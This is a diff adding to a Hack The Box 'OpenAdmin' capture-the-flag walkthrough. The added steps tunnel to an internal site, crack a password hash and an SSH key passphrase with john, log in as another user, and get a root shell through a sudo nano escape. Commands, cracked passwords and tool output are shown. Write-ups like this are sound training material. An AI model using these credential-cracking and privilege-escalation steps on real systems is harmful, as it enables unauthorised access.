@@ -10,6 +10,11 @@ tags:
   - Linux Host
   - OS Command Injection
   - SSH
+  - Password Cracking
+  - Internal Web Server
+  - www-data
+  - ssh2john
+  - id_rsa
 ---
 
 ![OpenAdmin Logo](/assets/images/HTB/openAdmin/openAdmin.png)
@@ -353,7 +358,7 @@ I logged into the mysql DB locally but couldn't find any further useful informat
 >mysql -u ona_sys -p -h localhost  
 >n1nj4W4rri0R!  
 
-## User Login - jimmy  
+## User Shell - jimmy  
 
 After scouring the local database, I decided to try the password to switch user (*su*) :  
 
@@ -366,4 +371,155 @@ jimmy@openadmin:/opt/ona/www/local/config$ id
 id
 uid=1000(jimmy) gid=1000(jimmy) groups=1000(jimmy),1002(internal)
 ```  
+
+Navigating to the directory that jimmy has access to in /var/www/ we see an internal website being hosted :  
+
+```bash 
+jimmy@openadmin:/var/www/internal$ ls -la
+ls -la
+total 20
+drwxrwx--- 2 jimmy internal 4096 Nov 23  2019 .
+drwxr-xr-x 4 root  root     4096 Nov 22  2019 ..
+-rwxrwxr-x 1 jimmy internal 3229 Nov 22  2019 index.php
+-rwxrwxr-x 1 jimmy internal  185 Nov 23  2019 logout.php
+-rwxrwxr-x 1 jimmy internal  339 Nov 23  2019 main.php
+```  
+
+Checking out the code for these, we find a login form in index.php with jimmy's SHA-512 hash and a command to print joanna's ssh hash in main.php :  
+
+![main.php code](/assets/images/HTB/openAdmin/internal-code.png)  
+
+We can check this website's configuration by navigating to /etc/apache2  
+
+```bash 
+jimmy@openadmin:/etc/apache2/sites-enabled$ ls
+internal.conf  openadmin.conf
+jimmy@openadmin:/etc/apache2/sites-enabled$ cat internal.conf
+Listen 127.0.0.1:52846
+
+<VirtualHost 127.0.0.1:52846>
+    ServerName internal.openadmin.htb
+    DocumentRoot /var/www/internal
+
+<IfModule mpm_itk_module>
+AssignUserID joanna joanna
+</IfModule>
+
+    ErrorLog ${APACHE_LOG_DIR}/error.log
+    CustomLog ${APACHE_LOG_DIR}/access.log combined
+
+</VirtualHost>
+```  
+
+So, here we see it is being hosted locally ("internal", not surprised) on port 52846.  
+
+To best connect to this and view it in a browser, we can SSH into jimmy and connect to that port over a tunnel using **-L**  
+
+```bash
+ssh jimmy@10.10.10.171 -L 52846:localhost:52846
+```  
+
+Now on our own machine, we navigate to localhost:52846 in our browser and there it is :  
+
+![internal website](/assets/images/HTB/openAdmin/internal.png)  
+
+Now we just need to grab the sha-512 hash from /var/www/internal/index.php and crack it real quick :  
+
+![Cracked Hash](/assets/images/HTB/openAdmin/cracked.png)  
+
+Great, so according to index.php, the username is also "jimmy"  
+
+>jimmy:Revealed  
+
+Once we are logged in, we see joanna's rsa private key in plain text, as per the main.php code.  
+
+Let's crack it with john and login to joanna over SSH :  
+
+## User Shell - joanna  
+
+First, copy the contents from ---BEGIN to ---END lines into a new file called id_rsa (ensure there is 1 empty line at the end of the file, save & close)  
+
+```bash
+ssh2john id_rsa > is_rsa.hash
+
+┌──(kali㉿kali)-[~/Documents/HTB/OpenAdmin]
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
+Cost 2 (iteration count) is 1 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+bloodninjas      (id_rsa)     
+1g 0:00:00:01 DONE (2022-05-12 02:43) 0.6024g/s 5767Kp/s 5767Kc/s 5767KC/s bloodofyouth..bloodmore23
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+```  
+
+>id_rsa passphrase:  bloodninjas  
+
+```bash
+┌──(kali㉿kali)-[~/Documents/HTB/OpenAdmin]
+└─$ ssh -i id_rsa joanna@10.10.10.171 
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+Permissions 0644 for 'id' are too open.
+It is required that your private key files are NOT accessible by others.
+This private key will be ignored.
+Load key "id": bad permissions
+joanna@10.10.10.171's password:
+
+# Change the permission to lower perms.:
+┌──(kali㉿kali)-[~/Documents/HTB/OpenAdmin]
+└─$ chmod 600 id_rsa     
+
+┌──(kali㉿kali)-[~/Documents/HTB/OpenAdmin]
+└─$ ssh joanna@10.10.10.171 -i id_rsa
+Enter passphrase for key 'id_rsa': bloodninjas
+Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)
+
+joanna@openadmin:~$ id
+uid=1001(joanna) gid=1001(joanna) groups=1001(joanna),1002(internal)
+```  
+
+![Joanna Flag](/assets/images/HTB/openAdmin/joanna-flag.png)  
+
+## Root Shell  
+
+Right off the bat we find a couple commands that joanna can execute with sudo:  
+
+```bash
+joanna@openadmin:~$ sudo -l
+Matching Defaults entries for joanna on openadmin:
+    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH", secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass
+
+User joanna may run the following commands on openadmin:
+    (ALL) NOPASSWD: /bin/nano /opt/priv
+```  
+
+/bin/nano strikes me as very interesting because I have done easy priv. esc. with sudo privileges on vim before.  
+Additionally, /opt/priv is an empty file of no type.  
+
+If we do some Googling, we discover some ways to escalate [privileges with nano](https://gtfobins.github.io/gtfobins/nano/) :  
+
+![Nano Shell](/assets/images/HTB/openAdmin/nano-esc.png)  
+
+This looks like the answer.  
+
+```bash
+joanna@openadmin:~$ sudo nano /opt/priv
+
+#Inside the empty nano window: 
+CTRL+R
+CTRL+X
+reset; sh 1>&0 2>&0
+ENTER
+```  
+
+And there you have it, a janky, half-nano, half-terminal root shell:  
+
+![Root Shell](/assets/images/HTB/openAdmin/root.png)  
+
+Thanks for reading through this walkthrough.  
 
